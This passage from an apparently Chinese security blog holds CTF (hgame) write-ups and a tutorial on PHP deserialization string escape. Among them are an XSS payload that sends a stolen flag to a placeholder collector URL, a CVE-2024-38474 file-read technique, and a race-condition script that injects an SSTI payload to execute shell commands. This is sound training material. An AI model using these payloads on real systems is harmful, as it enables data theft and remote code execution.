class="hljs-string">`input[name=&quot;username&quot;]`</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>, <span class="hljs-string">&quot;admin&quot;</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;password&quot;]`</span>, <span class="hljs-string">&quot;fake_password&quot;</span>),<br>chromedp.Click(<span class="hljs-string">`input[type=&quot;submit&quot;]`</span>),<br>chromedp.Navigate(<span class="hljs-string">&quot;/&quot;</span>),<br>chromedp.Sleep(<span class="hljs-number">5</span> * time.Second),<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时候他是admin权限的，那我们就可以xssfetch外带出来，搭建一个xss平台（这里我使用自己的）</p><p>在首页留言</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>()) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">flag</span> =&gt;</span> &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;你的网址?flag=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(flag)); &#125;); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>拿到flag</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250206155331709.png" alt="image-20250206155331709"></p><h2 id="双面人派对"><a href="#双面人派对" class="headerlink" title="双面人派对"></a><strong>双面人派对</strong></h2><p>看不懂。。。来个re大佬带带我</p><h2 id="角落"><a href="#角落" class="headerlink" title="角落"></a>角落</h2><p>首先访问robots.txt</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/app.conf</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>app<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>fuzz一下&#x2F;app&#x2F;发现两个</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/app/i</span>ndex<br><span class="hljs-regexp">/app/</span><span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>看看<code>/app.conf</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Include by httpd.conf</span><br><span class="hljs-section">&lt;Directory <span class="hljs-string">&quot;/usr/local/apache2/app&quot;</span>&gt;</span><br><span class="hljs-attribute">Options</span> Indexes<br><span class="hljs-attribute">AllowOverride</span> None<br><span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted<br><span class="hljs-section">&lt;/Directory&gt;</span><br><br><span class="hljs-section">&lt;Files <span class="hljs-string">&quot;/usr/local/apache2/app/app.py&quot;</span>&gt;</span><br>    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span><br>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><br><span class="hljs-section">&lt;/Files&gt;</span><br><br><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><br><span class="hljs-attribute">RewriteCond</span> <span class="hljs-string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="hljs-string">&quot;^L1nk/&quot;</span><br><span class="hljs-attribute">RewriteRule</span> <span class="hljs-string">&quot;^/admin/(.*)$&quot;</span> <span class="hljs-string">&quot;/$1.html?secret=todo&quot;</span><br><br><span class="hljs-attribute">ProxyPass</span> <span class="hljs-string">&quot;/app/&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span><br></code></pre></td></tr></table></figure><p>大概意思就是以&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app为根路径，但是不让访问app.py</p><p>但是当**user-agent为L1nk&#x2F;**开头是会重写规则把url改变,带UA头可以进行任意文件读取 是<a href="https://www.aqtd.com/nd.jsp?id=6874">CVE-2024-38474</a></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211111656036.png" alt="image-20250211111656036"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250211112403913.png" alt="image-20250211112403913"></p><p>访问&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py%3f，user-agent为L1nk&#x2F;Chrome得到app.py</p><p>带个？让file块无法匹配（<code>?</code> 是一个特殊字符，用于分隔<strong>路径</strong>和<strong>查询参数</strong>）</p><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br><span class="hljs-keyword">if</span> os.path.exists(filename):<br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>message = f.read()<br>f.close()<br><span class="hljs-keyword">return</span> message<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br><span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>status = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(message) <br>f.close()<br><br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br><span class="hljs-keyword">return</span> render_template_string(show)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>发现在首页写的都会存放在临时文件中，当我们访问read路由时都会读取最新一条还会检测存在<code>&#123;</code>吗 但是文件一直可以写入</p><p>那么我们大量的写入同时大量访问理论上可以在执行read_message（）的if判断时是正常的信息，而在渲染时是ssti代码就可以拿到shell</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>TARGET = <span class="hljs-string">&quot;http://node1.hgame.vidar.club:30288/app&quot;</span><br><br>MALICIOUS_PAYLOAD = <span class="hljs-string">&quot;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_benign</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;benign&quot;</span>&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_benign error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_malicious</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/send&quot;</span><br>    data = &#123;<span class="hljs-string">&quot;message&quot;</span>: MALICIOUS_PAYLOAD&#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(url, data=data, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.status_code<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;set_malicious error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_read</span>():<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET&#125;</span>/read&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        r = session.get(url, timeout=<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;trigger_read error:&quot;</span>, e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt</span>():<br>    set_benign()<br><br>    t = threading.Timer(<span class="hljs-number">0.01</span>, set_malicious)<br>    t.start()<br><br>    time.sleep(<span class="hljs-number">0.005</span>)<br><br>    result = trigger_read()<br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始尝试触发条件竞争漏洞以获得 flag ...&quot;</span>)<br>    attempt_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        attempt_count += <span class="hljs-number">1</span><br>        result = attempt()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;hgame&#123;&quot;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;可能成功获得 flag：&quot;</span>)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> attempt_count % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;尝试次数：<span class="hljs-subst">&#123;attempt_count&#125;</span>, 最近返回内容（前100字符）：<span class="hljs-subst">&#123;result[:<span class="hljs-number">100</span>]&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Compress-dot-new"><a href="#Compress-dot-new" class="headerlink" title="Compress dot new"></a><strong>Compress dot new</strong></h2><p>ds直接嗖了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 读取enc.txt文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;enc.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-number">1</span>)<br>    json_tree = content[<span class="hljs-number">0</span>]<br>    encoded_bits = content[<span class="hljs-number">1</span>].strip()<br><br><span class="hljs-comment"># 解析JSON树结构</span><br>huffman_tree = json.loads(json_tree)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_huffman</span>(<span class="hljs-params">tree, bit_str</span>):<br>    result = []<br>    current_node = tree<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bit_str:<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;a&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            current_node = current_node[<span class="hljs-string">&#x27;b&#x27;</span>]<br><br>        <span class="hljs-comment"># 检查是否为叶子节点</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">in</span> current_node:<br>            char_code = current_node[<span class="hljs-string">&#x27;s&#x27;</span>]<br>            result.append(char_code)<br>            current_node = tree  <span class="hljs-comment"># 重置到根节点</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-comment"># 解码并输出结果</span><br>decoded_bytes = decode_huffman(huffman_tree, encoded_bits)<br><span class="hljs-built_in">print</span>(decoded_bytes.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>flag: hgame{Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!}</strong></p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
      <tag>xss</tag>
      
      <tag>条件竞争</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化之字符串逃逸</title>
    <link href="/tuyi/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <url>/tuyi/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="常见的字符串逃逸"><a href="#常见的字符串逃逸" class="headerlink" title="常见的字符串逃逸"></a>常见的字符串逃逸</h2><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p>1.<strong>序列化字符串必须使用单引号 <code>&#39;</code>  包裹</strong>。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 <code>unserialize()</code> 报错。</p><p>2.再有特定的针对序列化后的字符串变长变短的情况下</p><ul><li>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&quot;mikasa&quot;;&#125;&#x27;</span>;<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#输出结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">array(2)&#123;</span><br><span class="hljs-comment">[0]=&gt; string(4) &quot;flag&quot;</span><br><span class="hljs-comment">  [1]=&gt; string(6) &quot;mikasa&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>一般情况下，按照我们的正常理解，上面例子中变量<code>$str</code>是一个标准的序列化后的字符串，按理来说改变其中任何一个字符都会导致反序列化失败。但事实并非如此。如果在<code>$str</code>结尾的花括号后加一些字符</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&quot;mikasa&quot;;&#125;abc&#x27;</span>;<br>  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#输出结果依然和上面的相同</span><br></code></pre></td></tr></table></figure><ul><li>这说明了反序列化的过程是有一定识别范围的，在这个范围之外的字符（如花括号外的abc）都会被忽略，不影响反序列化的正常进行、</li></ul><hr><h4 id="php-反序列化-的几大特性"><a href="#php-反序列化-的几大特性" class="headerlink" title="php[反序列化]的几大特性"></a>php[反序列化]的几大特性</h4><ul><li>PHP 在反序列化时，是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾（字符串除外）并且是根据长度判断内容的<ul><li>注意点: 很容易以为序列化后的字符串是<code>&#125;</code>结尾，实际上序列化字符串是以<code>;&#125;</code>结尾的，但对象序列化是直接<code>&#125;</code>结尾</li><li>php反序列化字符逃逸，就是通过这个结尾符实现的</li></ul></li><li>当长度不对应的时候会出现报错</li></ul><hr><h4 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h4><p>反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。</p><p>反序列化字符逃逸问题根据过滤函数一般分为两种，字符数增多和字符数减少</p><h5 id="字符数增多"><a href="#字符数增多" class="headerlink" title="字符数增多"></a>字符数增多</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-comment">//$str2 = filter($_GET[&#x27;user&#x27;]);</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br><span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>654321</code>，而不是<code>123456</code>？</p><ul><li>正常情况下反序列化字符串**$str1**的值为<code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li><li>那么把username的值变为<code>adminxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:8:&quot;adminyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul><li>因为比之前多了三个字符，反序列化时肯定是会失败的！</li><li>所以，可以利用多出来的字符串做一些坏事？</li></ul></li><li>想要password是<code>654321</code>，反序列化化前的字符串要是 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>如果说最后的是<ul><li><code>a:2:&#123;i:0;s:25:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>那么密码就会变成654321，<code>;&#125;</code>会被忽略</li><li>要构建的字段是 <code>&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code> 数一下是20个字符，</li><li>一个x会导致多出一个字符，所以加上20个x，<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>部分的内容会被当作无效部分被忽略</li></ul></li><li>所以最终输入是<ul><li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li><li>filter之后，会变为</li><li><code>a:2:&#123;i:0;s:45:&quot;adminyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li></ul></li></ul><h5 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-comment">//$str2 = filter(serialize($_GET[&#x27;user&#x27;]));</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br><span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>654321</code>，而不是<code>123456</code>？</p><ul><li>正常情况下反序列化字符串**$str1**的值为 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>那么把username的值变为<code>adminxxxxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:11:&quot;adminyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul><li>因为比之前少了三个字符，反序列化时肯定是会失败的,<code>amdinyyy</code>的长度为8，还会继续往后吞3个字符！但这样会造成语法错误！</li><li>所以，是否可以利用变化的字符长度做一些坏事？（吞掉原有的password值，再添加新值！）</li></ul></li><li>构建的注入表达式是<strong>后面部分需要可控</strong><ul><li><code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li><li>所以要吞掉的内容是<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code> 